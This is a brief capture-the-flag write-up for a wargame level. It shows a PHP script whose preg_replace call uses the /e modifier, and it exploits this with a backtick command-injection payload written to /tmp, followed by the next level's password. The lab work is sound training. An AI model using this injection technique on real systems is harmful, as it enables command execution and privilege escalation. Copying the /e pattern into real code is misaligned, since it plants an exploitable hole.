We can see a `.php` file and an executable file, both owned by `flag06` user.

Let’s see the php file first

```bash
#!/usr/bin/php
<?php
function y($m) { 
	$m = preg_replace("/\./", " x ", $m); 
	$m = preg_replace("/@/", " y", $m); 
	return $m; 
	}
function x($y, $z) { 
	$a = file_get_contents($y); 
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
	$a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); 
	return $a; }
$r = x($argv[1], $argv[2]); 
print $r;
?>
```

It takes two parameters, then calls function `y` and returns the value of its parameter assuming it refers to a file (we have file_get_content function)

Then there are replacements using regular expressions

It uses `/e` regex which is deprecated so `/(\[x (.*)\])/e` will evaluate any string given in the form `[x (.)]` , will interpret it as PHP code and call `y` function with “.” as parameter, allowing to inject getflag command, so let’s exploit it.

```bash
echo '[x ${`getflag`}]' > /tmp/get06
./level06 /tmp/get06
```

And we got out token so lets go

```bash
su level07
Password wiok45aaoguiboiki2tuin6ub
```